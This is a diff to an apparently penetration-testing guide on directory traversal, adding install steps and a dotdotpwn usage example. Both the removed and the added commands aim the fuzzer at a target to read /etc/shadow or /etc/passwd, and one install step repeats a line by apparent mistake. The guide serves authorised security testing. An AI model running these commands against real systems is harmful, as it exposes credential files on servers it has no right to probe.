@@ -67,9 +67,31 @@ Burp Intruder can be used to insert a list of directory traversal fuzz strings i
 
 [dotdotpwn](https://github.com/wireghoul/dotdotpwn) is a flexible fuzzer designed to discover directory traversal vulnerabilities in various software and web platforms.
 
+On Kali Linux the tool can be installed using APT:
 ```
-perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
+sudo apt install dotdotpwn
 ```
+
+Or it can be installed manually:
+
+```
+# clone from Git repository
+git clone https://github.com/wireghoul/dotdotpwn.git
+
+# install missing module
+sudo apt install dotdotpwn
+```
+
+For example, to check the specific parameter of a URL for path traversal the following command can be used:
+
+```
+dotdotpwn -m http-url -u https://victim.com/download?filename=TRAVERSAL -f /etc/passwd -s -b -q -k "root:"
+```
+
+## Interesting files
+
+1. [Interesting Linux files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-linux-files)
+2. [Interesting Windows files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-windows-files)
 
 ## Fuzzing lists
 
@@ -111,7 +133,7 @@ If it is considered unavoidable to pass user-controllable data to a filesystem o
 ## References
 
 1. [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
-2. [HackTricks - File Inclusion / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+2. [HackTricks - File Inclusion/Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 3. [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
 4. [OWASP - Testing Directory Traversal File Include](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)
 
